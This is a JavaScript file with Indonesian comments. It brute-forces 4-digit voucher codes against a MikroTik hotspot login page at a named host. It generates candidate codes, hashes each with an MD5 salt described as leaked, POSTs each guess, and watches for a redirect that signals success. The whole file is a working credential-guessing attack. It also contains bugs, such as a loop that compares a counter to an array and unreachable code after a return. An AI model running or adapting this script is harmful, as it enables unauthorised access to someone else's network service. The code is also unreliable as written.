function generateValidNumbers() {
  const result = [];

  function backtrack(current, freq) {
    // Kalau sudah 4 digit → simpan
    if (current.length === 4) {
      result.push(parseInt(current.join("")));
      return;
    }

    for (let d = 0; d <= 9; d++) {
      // Digit pertama tidak boleh 0
      if (current.length === 0 && d === 0) continue;

      // Cek max 2x
      if ((freq[d] || 0) >= 2) continue;

      // Cek 3 berurutan (ambil 2 digit terakhir)
      const len = current.length;
      if (len >= 2) {
        const a = current[len - 2];
        const b = current[len - 1];
        const c = d;

        const ascending = (b === a + 1) && (c === b + 1);
        const descending = (b === a - 1) && (c === b - 1);

        if (ascending || descending) continue;
      }

      // pilih
      current.push(d);
      freq[d] = (freq[d] || 0) + 1;

      backtrack(current, freq);

      // undo
      current.pop();
      freq[d]--;
    }
  }

  backtrack([], {});
  return result;
//   return localStorage.setItem("wifi", JSON.stringify(result))
}

// Run
// const numbers = generateValidNumbers();
// console.log(numbers);
// console.log("Total:", numbers.length);




async function bruteForceFetch(voucher) {
    const targetUrl = "http://hs.shinthink.net/login";
    
    // 1. Menyiapkan Body Data (Meniru isi form)
    const formData = new URLSearchParams();
    formData.append('username', voucher);
    // Menghitung MD5 sesuai logika 'salt' yang bocor di kode Anda
    formData.append('password', hexMD5('\216' + voucher + '\142\064\014\331\361\327\367\055\165\157\325\030\205\355\335\002'));
    formData.append('dst', 'http://www.msftconnecttest.com/redirect');
    formData.append('popup', 'true');

    // 2. Mengirim request POST di latar belakang
    try {
        const response = await fetch(targetUrl, {
            method: 'POST',
            body: formData,
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
        });

        // 3. Cek apakah berhasil (MikroTik biasanya redirect jika sukses)
        if (response.redirected || response.url.includes("status")) {
            console.log("SUKSES! Voucher: " + voucher);
            window.location.href = response.url; // Pindah ke halaman sukses
        } else {
            console.log("Gagal: " + voucher);
        }
    } catch (err) {
        console.error("Koneksi terputus/Error");
    }
}



class wifi {
    constructor () {

    }
    generateValidNumbers() {
        const result = [];

        function backtrack(current, freq) {
            // Kalau sudah 4 digit → simpan
            if (current.length === 4) {
            result.push(parseInt(current.join("")));
            return;
            }

            for (let d = 0; d <= 9; d++) {
            // Digit pertama tidak boleh 0
            if (current.length === 0 && d === 0) continue;

            // Cek max 2x
            if ((freq[d] || 0) >= 2) continue;

            // Cek 3 berurutan (ambil 2 digit terakhir)
            const len = current.length;
            if (len >= 2) {
                const a = current[len - 2];
                const b = current[len - 1];
                const c = d;

                const ascending = (b === a + 1) && (c === b + 1);
                const descending = (b === a - 1) && (c === b - 1);

                if (ascending || descending) continue;
            }

            // pilih
            current.push(d);
            freq[d] = (freq[d] || 0) + 1;

            backtrack(current, freq);

            // undo
            current.pop();
            freq[d]--;
            }
        }

        backtrack([], {});
        return result;
        return localStorage.setItem("wifi", JSON.stringify(result))
    }
    async isReallyOnline() {
		// 1. Cek dasar: Jika browser bilang offline, biasanya memang offline.
		if (typeof navigator !== "undefined" && !navigator.onLine) {
			return false;
		}

		const checkEndpoints = [
			"https://clients3.google.com/generate_204", // Endpoint sangat ringan dari Google
			this.URL // Mencoba ping ke Base URL kamu sendiri
		];

		let attempts = 0;
		const maxPingAttempts = 2;

		while (attempts < maxPingAttempts) {
			attempts++;
			try {
				this._log(`🔍 Pengecekan sinyal aktif (Percobaan ${attempts})...`);
				
				// Gunakan mode no-cors agar lebih cepat dan tidak terhambat kebijakan CORS
				// Timeout pendek (5 detik) agar user tidak menunggu terlalu lama
				const controller = new AbortController();
				const timeoutId = setTimeout(() => controller.abort(), 5000);

				const ping = await fetch(checkEndpoints[0], { 
					mode: 'no-cors', 
					cache: 'no-store',
					signal: controller.signal 
				});

				clearTimeout(timeoutId);
				
				// Jika sampai sini tanpa error, berarti paket data berhasil keluar-masuk
				this._log("📶 Sinyal terkonfirmasi Aktif.");
				return true; 

			} catch (err) {
				this._log(`⚠️ Percobaan ping ${attempts} gagal.`);
				if (attempts < maxPingAttempts) {
					// Beri jeda 1 detik sebelum cek ulang
					await new Promise(r => setTimeout(r, 1000));
				}
			}
		}

		// Jika setelah 3 kali tetap gagal
		this._log("❌ Terkonfirmasi: Perangkat Terhubung tapi Tidak Ada Internet.");
		return false;
	}
    _log() { 
        try { 
            var args = Array.prototype.slice.call(arguments);
            console.log.apply(console, ["[Wifi]"].concat(args)); 
        } catch(_) {}
    }
    async bruteForceFetch(voucher) {
        const targetUrl = "http://hs.shinthink.net/login";

        // const hashArray = Array.from(new Uint8Array(`\216 ${voucher} \142\064\014\331\361\327\367\055\165\157\325\030\205\355\335\002`))
        // Gunakan ini untuk hasil yang aman dan valid di JavaScript modern
        const hashArray = Array.from(new Uint8Array(`\x8e ${voucher} \x62\x34\x0c\xd9\xf1\xd7\xf7\x2d\x75\x6f\xd5\x18\x85\xed\xdd\x02`));
        // 1. Menyiapkan Body Data (Meniru isi form)
        const formData = new URLSearchParams();
        formData.append('username', voucher);
        // Menghitung MD5 sesuai logika 'salt' yang bocor di kode Anda
        // formData.append('password', hexMD5(`\216 ${voucher} \142\064\014\331\361\327\367\055\165\157\325\030\205\355\335\002`));
        formData.append('password', hexMD5(`\x8E${voucher}\x62\x34\x0C\xD9\xF1\xD7\xF7\x2D\x75\x6F\xD5\x18\x85\xED\xDD\x02`));
        formData.append('dst', 'http://www.msftconnecttest.com/redirect');
        formData.append('popup', 'true');

        // 2. Mengirim request POST di latar belakang
        try {
            const response = await fetch(targetUrl, {
                method: 'POST',
                body: formData,
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            });

            const isOnline = await this.isReallyOnline()
            if (isOnline) console.log("success - online")
            // 3. Cek apakah berhasil (MikroTik biasanya redirect jika sukses)
            if (response.redirected || response.url.includes("status")) {
                console.log("SUKSES! Voucher: " + voucher);
                window.location.href = response.url; // Pindah ke halaman sukses
                return true
            } else {

                console.log("Gagal: " + voucher);
                return false
            }
        } catch (err) {
            console.error("Koneksi terputus/Error");
            return false
        }
    }
    async loops (codes) {
        // const codes = this.generateValidNumbers()
        // return console.log(codes)
        const length = codes.length
        let i = 0

        console.log(length)

        while (i < codes) {
            try {
                const resp = await this.bruteForceFetch(codes[i])
                if (resp) i = length
                // else i ++
            } catch (e) {
                console.log("Failed")
            }
            i++
        }
    }
    async play () {
        const data = this.generateValidNumbers()
        console.log(data)
        await this.loops(data)
    }
}

const wf = await new wifi().play()